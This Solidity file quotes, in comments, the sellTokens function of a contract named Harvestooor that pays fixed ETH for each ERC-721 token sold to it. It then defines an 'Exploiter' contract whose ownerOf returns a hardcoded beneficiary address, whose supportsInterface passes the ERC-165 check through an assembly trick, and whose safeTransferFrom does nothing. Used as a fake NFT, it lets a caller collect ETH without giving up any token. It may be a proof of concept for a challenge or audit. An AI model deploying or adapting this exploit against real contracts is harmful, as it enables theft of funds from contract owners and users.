// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Sections of interest:

// /**
//  * Struct which represent a ERC-721 NFT.
//  */
// struct NFT {
//     address tokenAddress;
//     uint256 tokenId;
// }

// /**
//  * Function which enables external consumers to sell
//  * multiple ERC-721 NFTs to the contract. By calling this function,
//  * the contract will transfer the tokens to itself (the contract)
//  * and pay the sender a fixed amount of ETH for each token.
//  */
// function sellTokens(NFT[] calldata tokens)
//     external
//     nonReentrant
//     whenNotPaused
// {
//     // Require 'tokens' to not be empty
//     require(tokens.length > 0, "Harvestooor: 'tokens' must not be empty");

//     address payable sender = payable(msg.sender);
//     uint256 calculatedValue = tokens.length * FIXED_NFT_VALUE;

//     // Require contract to contain enough ETH balance
//     require(
//         address(this).balance >= calculatedValue,
//         "Harvestooor: Insufficient Balance"
//     );

//     for (uint256 i = 0; i < tokens.length; ++i) {
//         address tokenAddress = tokens[i].tokenAddress;
//         uint256 tokenId = tokens[i].tokenId;

//         // Sanity check NFT implements IERC721 interface
//         require(
//             tokenAddress.supportsInterface(type(IERC721).interfaceId),
//             "Harvestooor: Token must implement IERC721 interface"
//         );

//         IERC721 nft = IERC721(tokenAddress);

//         // Sanity check NFT is being sold by its owner
//         require(
//             nft.ownerOf(tokenId) == sender,
//             "Harvestooor: NFT must be sold by its owner"
//         );

//         // Write owner to ownerByToken map
//         _priorOwnerByToken[tokenAddress][tokenId] = sender;

//         // Safe Transfer NFT to self (this contract)
//         nft.safeTransferFrom(sender, address(this), tokenId);
//     }

//     // Emit event
//     emit TokensHarvested(sender, tokens);

//     // Transfer ETH to sender
//     Address.sendValue(sender, calculatedValue);
// }

contract Exploiter {

    address constant beneficiary = 0x0b0854389083f9a35fD1D316D14EEeBd8D36d898;

    function ownerOf(uint id) public pure returns(address) {
        return beneficiary;
    }

    // https://eips.ethereum.org/EIPS/eip-165
    // Therefore the implementing contract will have a supportsInterface function that returns:
    //
    // * true when interfaceID is 0x01ffc9a7 (EIP165 interface)
    // * false when interfaceID is 0xffffffff
    // * true for any other interfaceID this contract implements
    // * false for any other interfaceID
    function supportsInterface(bytes4 interfaceId) public pure returns(bool supported) {
        assembly {
            supported := xor(calldataload(0x4), 0xffffffff00000000000000000000000000000000000000000000000000000000)
        }
    }

    function safeTransferFrom(address from, address to, uint tokenId) public pure {
        
    }
    
}
